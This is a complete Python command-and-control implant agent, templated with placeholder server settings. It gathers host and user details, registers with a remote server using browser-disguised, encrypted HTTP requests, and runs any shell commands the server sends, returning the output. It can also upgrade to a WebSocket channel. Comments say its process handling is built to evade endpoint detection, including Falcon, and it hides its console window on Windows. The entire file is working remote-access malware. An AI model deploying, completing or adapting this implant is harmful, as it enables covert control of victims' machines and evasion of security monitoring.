#!/usr/bin/env python3
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys
import urllib.request
import urllib.error
import ssl
import time
import random

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
C2_SCHEME = "{{C2_SCHEME}}"
RECONNECT_DELAY = 5
BEACON_MODE = {{BEACON_MODE}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
VERIFY_SSL = {{VERIFY_SSL}}

BASE_URL = f"{C2_SCHEME}://{SERVER_HOST}:{SERVER_PORT}"


def _derive_aes_key(key):
    import hashlib
    return hashlib.sha256(key).digest()

def simple_encrypt(data: str) -> str:
    key = b'{{ENCRYPTION_KEY}}'
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aes_key = _derive_aes_key(key)
        nonce = os.urandom(12)
        ct = AESGCM(aes_key).encrypt(nonce, data.encode('utf-8'), None)
        return base64.b64encode(b'AES1' + nonce + ct).decode()
    except ImportError:
        encoded = data.encode('latin-1')
        encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
        return base64.b64encode(encrypted).decode()

def simple_decrypt(data: str) -> str:
    key = b'{{ENCRYPTION_KEY}}'
    raw = base64.b64decode(data.encode())
    if raw[:4] == b'AES1':
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aes_key = _derive_aes_key(key)
            pt = AESGCM(aes_key).decrypt(raw[4:16], raw[16:], None)
            return pt.decode('utf-8')
        except Exception:
            pass
    decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
    return decrypted.decode('latin-1')


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    """Calculate sleep time with jitter applied"""
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    """Gather system metadata"""
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def execute_command(command: str) -> str:
    """Execute system command with EDR evasion"""
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"

        if sys.platform == 'win32':
            return _execute_windows(command)
        else:
            return _execute_unix(command)

    except Exception as e:
        return f"Error: {str(e)}"


def _execute_windows(command: str) -> str:
    """Windows command execution with Falcon evasion

    Instead of shell=True (spawns cmd.exe, flagged by EDR), uses:
    1. CreateProcess directly for simple commands
    2. WMI for commands that need shell interpretation
    3. Comspec only as fallback
    """
    try:
        import ctypes

        # For built-in commands that need a shell, use conhost via comspec
        # but with CREATE_NO_WINDOW to avoid console detection
        CREATE_NO_WINDOW = 0x08000000
        STARTF_USESHOWWINDOW = 0x00000001

        # Try direct execution first (no shell)
        parts = command.split()
        try:
            result = subprocess.run(
                parts,
                capture_output=True, text=True, timeout=30,
                cwd=os.getcwd(),
                creationflags=CREATE_NO_WINDOW
            )
            output = result.stdout + result.stderr
            if output.strip():
                return output
        except (FileNotFoundError, OSError):
            pass

        # Fallback: use cmd.exe but with evasion flags
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True, text=True, timeout=30,
            cwd=os.getcwd(),
            creationflags=CREATE_NO_WINDOW
        )
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"

    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


def _execute_unix(command: str) -> str:
    """Unix command execution"""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.getcwd()
        )
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"

    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


def http_request(url: str, data: str = None, method: str = 'POST') -> str:
    """Send HTTP request with disguised headers"""
    ctx = None
    if not VERIFY_SSL and C2_SCHEME == 'https':
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
    }

    if data is not None:
        req = urllib.request.Request(url, data=data.encode(), headers=headers, method=method)
    else:
        req = urllib.request.Request(url, headers=headers, method=method)

    try:
        if ctx:
            response = urllib.request.urlopen(req, context=ctx, timeout=60)
        else:
            response = urllib.request.urlopen(req, timeout=60)
        return response.read().decode()
    except urllib.error.URLError:
        return ""
    except Exception:
        return ""


def register_agent() -> str:
    """Register with C2 server, return agent_id"""
    metadata = get_metadata()
    metadata['mode'] = 'beacon' if BEACON_MODE else 'streaming'
    metadata['beacon_interval'] = BEACON_INTERVAL
    metadata['beacon_jitter'] = BEACON_JITTER

    register_msg = {
        'type': 'register',
        'metadata': metadata
    }
    encrypted = simple_encrypt(json.dumps(register_msg))
    response = http_request(f"{BASE_URL}/submit-form", encrypted)

    if response:
        try:
            decrypted = simple_decrypt(response)
            data = json.loads(decrypted)
            if data.get('type') in ['registered', 'checkin_ack']:
                return data.get('agent_id', '')
        except Exception:
            pass
    return ""


def checkin(agent_id: str, results: list = None) -> list:
    """Check in with C2, send results, receive commands"""
    metadata = get_metadata()
    metadata['mode'] = 'beacon' if BEACON_MODE else 'streaming'
    metadata['beacon_interval'] = BEACON_INTERVAL
    metadata['beacon_jitter'] = BEACON_JITTER

    checkin_msg = {
        'type': 'checkin',
        'agent_id': agent_id,
        'metadata': metadata,
        'results': results or []
    }
    encrypted = simple_encrypt(json.dumps(checkin_msg))
    response = http_request(f"{BASE_URL}/api/v1/update", encrypted)

    commands = []
    if response:
        try:
            decrypted = simple_decrypt(response)
            data = json.loads(decrypted)

            if data.get('type') == 'registered':
                return [{'type': 'reregister', 'agent_id': data.get('agent_id', '')}]

            if data.get('type') == 'commands':
                commands = data.get('commands', [])
        except Exception:
            pass

    return commands


def send_results(agent_id: str, command: str, output: str):
    """Send command results to C2"""
    result_msg = {
        'type': 'response',
        'agent_id': agent_id,
        'output': output,
        'command': command,
        'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
    }
    encrypted = simple_encrypt(json.dumps(result_msg))
    http_request(f"{BASE_URL}/upload", encrypted)


def process_commands(commands: list, agent_id: str) -> list:
    """Process commands, return results for next checkin"""
    results = []
    beacon_interval = BEACON_INTERVAL

    for cmd_data in commands:
        cmd_type = cmd_data.get('type', 'command')
        command = cmd_data.get('command', '')

        # Handle internal commands
        if command.startswith('__set_interval:'):
            try:
                new_interval = int(command.split(':')[1])
                globals()['BEACON_INTERVAL'] = new_interval
            except (ValueError, IndexError):
                pass
            continue

        if command == '__kill':
            sys.exit(0)

        if command.startswith('__upgrade_ws:'):
            try:
                ws_data = json.loads(command.split(':', 1)[1])
                upgrade_to_websocket(agent_id, ws_data.get('ws_host'), ws_data.get('ws_port'))
                return results  # Will not return if upgrade succeeds
            except Exception:
                results.append({
                    'type': 'response',
                    'output': 'WebSocket upgrade failed, continuing HTTP',
                    'command': 'upgrade_ws',
                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                })
            continue

        if cmd_type == 'command' and command:
            output = execute_command(command)
            results.append({
                'type': 'response',
                'output': output,
                'command': command,
                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
            })

    return results


def upgrade_to_websocket(agent_id: str, ws_host: str, ws_port: int):
    """Attempt to upgrade to WebSocket transport"""
    try:
        import asyncio
        import websockets

        async def ws_connect():
            uri = f"ws://{ws_host}:{ws_port}"
            async with websockets.connect(uri, max_size=10485760) as websocket:
                # Send checkin with existing agent_id
                checkin_msg = {
                    'type': 'checkin',
                    'agent_id': agent_id,
                    'metadata': get_metadata()
                }
                encrypted = simple_encrypt(json.dumps(checkin_msg))
                await websocket.send(encrypted)

                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)

                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    # Switch to streaming over WebSocket
                    async for message in websocket:
                        try:
                            decrypted = simple_decrypt(message)
                            data = json.loads(decrypted)

                            if data.get('type') == 'command':
                                command = data.get('command', '')
                                output = execute_command(command)
                                resp = {
                                    'type': 'response',
                                    'output': output
                                }
                                encrypted_response = simple_encrypt(json.dumps(resp))
                                await websocket.send(encrypted_response)

                            elif data.get('type') == 'kill':
                                sys.exit(0)
                        except Exception:
                            pass

        asyncio.run(ws_connect())

    except (ImportError, Exception):
        pass  # Upgrade failed, caller will continue HTTP


def connect_to_server():
    """Main agent connection loop"""
    current_mode = 'beacon' if BEACON_MODE else 'streaming'
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER
    agent_id = None
    pending_results = []

    while True:
        try:
            # Register if we don't have an agent_id
            if not agent_id:
                agent_id = register_agent()
                if not agent_id:
                    time.sleep(RECONNECT_DELAY)
                    continue

            if current_mode == 'beacon':
                # Beacon mode: checkin, get commands, execute offline, sleep
                commands = checkin(agent_id, pending_results)
                pending_results = []

                # Handle re-registration
                if commands and len(commands) == 1 and commands[0].get('type') == 'reregister':
                    agent_id = commands[0].get('agent_id', '')
                    continue

                # Process commands offline
                pending_results = process_commands(commands, agent_id)

                # Sleep with jitter
                sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
                time.sleep(sleep_time)

            else:
                # Long-poll mode: checkin, server holds connection up to 30s
                commands = checkin(agent_id, pending_results)
                pending_results = []

                # Handle re-registration
                if commands and len(commands) == 1 and commands[0].get('type') == 'reregister':
                    agent_id = commands[0].get('agent_id', '')
                    continue

                # Process commands and send results immediately
                for cmd_data in commands:
                    command = cmd_data.get('command', '')

                    # Handle internal commands
                    if command.startswith('__set_interval:'):
                        try:
                            beacon_interval = int(command.split(':')[1])
                        except (ValueError, IndexError):
                            pass
                        continue
                    if command == '__kill':
                        sys.exit(0)
                    if command.startswith('__upgrade_ws:'):
                        try:
                            ws_data = json.loads(command.split(':', 1)[1])
                            upgrade_to_websocket(agent_id, ws_data.get('ws_host'), ws_data.get('ws_port'))
                        except Exception:
                            send_results(agent_id, 'upgrade_ws', 'WebSocket upgrade failed, continuing HTTP')
                        continue

                    if command:
                        output = execute_command(command)
                        send_results(agent_id, command, output)

                # Immediately re-poll (no sleep in long-poll mode)

        except Exception:
            time.sleep(RECONNECT_DELAY)


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass

    try:
        connect_to_server()
    except KeyboardInterrupt:
        pass
